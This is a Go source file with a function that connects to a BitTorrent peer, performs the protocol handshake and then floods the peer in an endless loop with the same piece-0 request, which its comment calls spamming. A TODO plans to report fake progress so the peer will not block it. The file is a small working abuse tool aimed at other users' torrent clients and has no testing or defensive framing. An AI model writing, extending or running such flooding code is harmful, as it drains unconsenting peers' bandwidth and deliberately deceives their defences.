package util

import (
	"encoding/hex"
	"fmt"
	"log"
	"net"
)

// Connect to a peer and spam request piece messages
func ConnectPeer(peerAddr string, infoHash string) {
	conn, err := net.Dial("tcp", peerAddr)
	if err != nil {
		panic(err)
	}
	defer conn.Close()

	infoHashBytes, err := hex.DecodeString(infoHash)
	if err != nil {
		panic(err)
	}
	payload := []byte("\x13" + "BitTorrent protocol" + "\x00\x00\x00\x00\x00\x00\x00\x00" + string(infoHashBytes) + RandomPeerId())

	_, err = conn.Write(payload)
	if err != nil {
		panic(err)
	}

	log.Println("Handshake sent: ", string(payload))

	// Read all from peer
	buf := make([]byte, 102400)
	n, err := conn.Read(buf)
	if err != nil {
		panic(err)
	}

	fmt.Println("Received: ", string(buf[:n]))

	// Msg: Interested
	payload = []byte("\x00\x00\x00\x01\x02")
	_, err = conn.Write(payload)
	if err != nil {
		panic(err)
	}

	count := 0

	// TODO: report a fake progress to avoid being blocked by peer
	for {
		// Msg: request piece 0, offset 0, length 0x4000
		payload = []byte("\x00\x00\x00\x0d" + "\x06" + "\x00\x00\x00\x00" + "\x00\x00\x00\x00" + "\x00\x00\x40\x00")
		n, err = conn.Write(payload)
		log.Println("Write: ", n, err)

		n, err = conn.Read(buf)
		log.Println("Read: ", n, err)

		count += 1

		if count%100 == 0 {
			log.Println(count)
		}
	}
}
